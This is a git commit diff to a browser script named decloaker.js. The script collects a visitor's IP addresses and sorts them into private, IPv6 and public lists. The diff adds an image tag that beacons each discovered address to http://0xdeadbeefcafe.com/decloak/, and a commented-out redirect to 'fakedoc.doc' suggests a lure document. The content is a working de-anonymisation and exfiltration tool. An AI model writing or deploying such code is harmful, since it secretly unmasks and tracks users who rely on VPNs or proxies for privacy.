12f847e4e37be593a6db75d1de67b4c4bf8faa49
cldrn <paulino@calderonpale.com>
2015-11-23 09:00:51 -0500

    Loads js files to decloak

--- decloaker.js
+++ decloaker.js
@@ -43,13 +43,14 @@
       }, 1000);
   }
   getIPs(function(ip){
-      var li = document.createElement("li");
-      li.textContent = ip;
-                alert(ip);
+      var imgtag = document.createElement("img");
+      imgtag.src = "http://0xdeadbeefcafe.com/decloak/"+ip;
+      alert(ip);
       if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/))
-        document.getElementsByTagName("ul")[0].appendChild(li);
+        document.getElementsByTagName("ul")[0].appendChild(imgtag);
       else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/))
-        document.getElementsByTagName("ul")[2].appendChild(li);
+        document.getElementsByTagName("ul")[2].appendChild(imgtag);
       else
-        document.getElementsByTagName("ul")[1].appendChild(li);
+        document.getElementsByTagName("ul")[1].appendChild(imgtag);
   });
+  //window.location = "fakedoc.doc";
